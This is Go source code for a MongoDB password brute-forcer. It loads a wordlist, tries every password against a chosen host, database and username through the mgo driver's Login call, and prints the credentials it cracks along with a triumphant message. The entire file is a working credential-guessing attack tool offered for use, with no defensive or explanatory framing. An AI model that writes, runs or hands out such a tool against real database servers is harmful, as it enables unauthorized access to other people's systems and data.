package main

import (
	"flag"
	"fmt"

	"labix.org/v2/mgo"
	//"labix.org/v2/mgo/bson"
	"bytes"
	"io/ioutil"
)

var VERBOSE bool
var PASSFILE string
var HOSTNAME string
var DB string
var USERNAME string

func login(db *mgo.Database, user, pass []byte) bool {
	if VERBOSE {
		fmt.Printf("Trying: %s:%s... ", user, pass)
	}
	err := db.Login(string(user[:]), string(pass[:]))
	if err != nil {
		return false
	} else {
		return true
	}
}

func passwords(filename string) [][]byte {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		panic(err)
	}
	words := bytes.Split(data, []byte{'\n'})

	fmt.Println("Loaded password list! Total words:", len(words))
	return words
}

func main() {
	flag.BoolVar(&VERBOSE, "verbose", false, "display each attempt")
	flag.StringVar(&HOSTNAME, "hostname", "127.0.01", "hostname containing MongoDB")
	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
	flag.StringVar(&DB, "database", "admin", "name of database to use")
	flag.StringVar(&USERNAME, "username", "abc", "username to bruteforce")
	flag.Parse()

	session, err := mgo.Dial(HOSTNAME)
	if err != nil {
		panic(err)
	}

	username := []byte(USERNAME)
	passwords := passwords(PASSFILE)

	defer session.Close()
	session.SetMode(mgo.Monotonic, true)

	db := session.DB(DB)
	for i, password := range passwords {
		if login(db, username, password) {
			fmt.Printf("\n-----WE DID IT %s %s-----\n", username, password)
			fmt.Printf("Number of tries: %d\n", i)
			return
		} else {
			if VERBOSE {
				fmt.Println(" FAIL")
			}
		}
	}
}
